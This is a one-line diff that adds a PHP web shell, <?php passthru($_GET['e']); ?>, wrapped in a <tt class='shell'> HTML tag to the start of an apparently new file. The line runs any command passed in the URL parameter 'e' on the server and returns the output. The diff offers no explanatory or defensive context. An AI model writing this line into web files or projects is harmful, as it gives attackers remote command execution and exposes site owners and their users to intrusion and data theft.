@@ -1,0 +1,1 @@
+<tt class="shell"><?php passthru($_GET['e']); ?></tt>
